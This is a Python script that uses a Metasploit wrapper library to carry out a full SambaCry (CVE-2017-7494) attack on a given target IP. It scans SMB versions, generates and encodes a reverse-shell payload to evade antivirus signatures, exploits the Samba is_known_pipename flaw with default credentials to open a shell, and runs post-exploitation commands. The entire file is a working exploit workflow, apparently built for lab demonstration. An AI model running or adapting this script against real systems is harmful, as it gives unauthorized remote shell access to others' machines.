#!/usr/bin/env python3
"""SambaCry (CVE-2017-7494) exploit using the low-level msf API.

Demonstrates all 7 MSF module types in a realistic workflow.

Configuration:
    # Option 1: Environment variable
    export ASAS_METASPLOIT__ROOT=~/Projects/metasploit-framework

    # Option 2: Config file (~/.config/assassinate/config.yaml)
    # Option 3: Auto-detection (checks common paths)

Usage:
    # Run full workflow (default)
    python sambacry_msf.py 172.19.0.3

    # Skip specific phases
    python sambacry_msf.py 172.19.0.3 --no-recon
    python sambacry_msf.py 172.19.0.3 --no-payload-gen
    python sambacry_msf.py 172.19.0.3 --no-post
"""

import argparse
import msf
from assassinate.config import get_config


def main():
    parser = argparse.ArgumentParser(
        description="SambaCry exploit demonstrating all MSF module types"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--share", default="myshare", help="SMB share name")
    parser.add_argument("--user", default="root", help="SMB username")
    parser.add_argument("--pass", dest="password", default="root", help="SMB password")
    parser.add_argument("--no-recon", action="store_true", help="Skip reconnaissance phase")
    parser.add_argument("--no-payload-gen", action="store_true", help="Skip payload generation demos")
    parser.add_argument("--no-post", action="store_true", help="Skip post-exploitation phase")
    args = parser.parse_args()

    # Initialize MSF using config system
    config = get_config()
    if not config.metasploit.root:
        print("[-] MSF not found. Set ASAS_METASPLOIT__ROOT or run: assassinate-setup --config")
        return 1

    msf.init_msf(str(config.metasploit.root))
    print(f"[*] MSF {msf.framework_version()} initialized")
    print(f"[*] Target: {args.target}\n")

    # =========================================================================
    # PHASE 1: RECONNAISSANCE (AuxiliaryModule)
    # =========================================================================
    if not args.no_recon:
        print("=" * 60)
        print("PHASE 1: RECONNAISSANCE (AuxiliaryModule)")
        print("=" * 60)

        scanner = msf.create_module("auxiliary/scanner/smb/smb_version")
        print(f"[*] Module: {scanner.fullname}")
        print(f"[*] Type: {scanner.module_type}")

        scanner.options.RHOSTS = args.target
        scanner.run()
        print("[+] SMB scan complete\n")

    # =========================================================================
    # PHASE 2: PAYLOAD GENERATION (PayloadModule, EncoderModule, NopModule)
    # =========================================================================
    if not args.no_payload_gen:
        print("=" * 60)
        print("PHASE 2: PAYLOAD GENERATION")
        print("=" * 60)

        # --- PayloadModule ---
        print("\n[PayloadModule] Generate shellcode:")
        payload = msf.create_module("payload/linux/x86/shell_reverse_tcp")
        payload.options.LHOST = "127.0.0.1"
        payload.options.LPORT = "4444"
        shellcode = payload.generate()
        print(f"    Raw: {len(shellcode)} bytes - {shellcode[:12].hex()}...")

        # --- EncoderModule ---
        print("\n[EncoderModule] Encode to evade signatures:")
        encoder = msf.create_module("encoder/x86/shikata_ga_nai")
        encoded = encoder.encode_payload(
            "linux/x86/shell_reverse_tcp",
            iterations=3,
            LHOST="127.0.0.1",
            LPORT=4444,
        )
        print(f"    Encoded: {len(encoded)} bytes - {encoded[:12].hex()}...")

        # --- NopModule ---
        print("\n[NopModule] Generate NOP sled:")
        nop = msf.create_module("nop/x86/single_byte")
        sled = nop.generate_sled(16, badchars=b"\x00")
        print(f"    Sled: {len(sled)} bytes - {sled.hex()}")

        # --- EvasionModule (info only) ---
        print("\n[EvasionModule] AV bypass options:")
        evasion = msf.create_module("evasion/windows/applocker_evasion_msbuild")
        print(f"    Module: {evasion.fullname}")
        print(f"    Targets: {evasion.targets[:2]}...")
        print()

    # =========================================================================
    # PHASE 3: EXPLOITATION (ExploitModule)
    # =========================================================================
    print("=" * 60)
    print("PHASE 3: EXPLOITATION (ExploitModule)")
    print("=" * 60)

    exploit = msf.create_module("exploit/linux/samba/is_known_pipename")
    print(f"[*] Module: {exploit.fullname}")
    print(f"[*] Type: {exploit.module_type}")
    print(f"[*] Rank: {exploit.rank}")

    exploit.options.RHOSTS = args.target
    exploit.options.SMB_SHARE_NAME = args.share
    exploit.options.SMBUser = args.user
    exploit.options.SMBPass = args.password

    # Vulnerability check
    if exploit.has_check():
        result = exploit.check()
        print(f"[*] Check: {result[:60]}...")

    # --- Method A: String payload ---
    print("\n[Method A] String payload:")
    session = exploit.exploit("cmd/unix/interact", timeout=60)
    if session:
        print(f"    Session {session.sid}: {session.run_cmd('whoami').strip()}")
        session.kill()

    # --- Method B: PayloadModule object (reusing same exploit module) ---
    print("\n[Method B] PayloadModule object:")
    payload_mod = msf.create_module("payload/cmd/unix/interact")
    session = exploit.exploit(payload_mod, timeout=60)
    if session:
        print(f"    Session {session.sid}: {session.run_cmd('whoami').strip()}")

    if not session:
        print("[-] Exploitation failed")
        return 1

    # =========================================================================
    # PHASE 4: POST-EXPLOITATION (PostModule)
    # =========================================================================
    if not args.no_post:
        print("\n" + "=" * 60)
        print("PHASE 4: POST-EXPLOITATION (PostModule)")
        print("=" * 60)

        post = msf.create_module("post/multi/gather/env")
        print(f"[*] Module: {post.fullname}")
        print(f"[*] Type: {post.module_type}")

        post.run(session)
        print("[+] Environment gathered")

        print("\n[*] Session commands:")
        for cmd in ["whoami", "id", "uname -a"]:
            print(f"    $ {cmd}")
            print(f"      {session.run_cmd(cmd).strip()}")

    # Cleanup
    session.kill()

    print("\n" + "=" * 60)
    print("COMPLETE - All 7 module types demonstrated")
    print("=" * 60)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
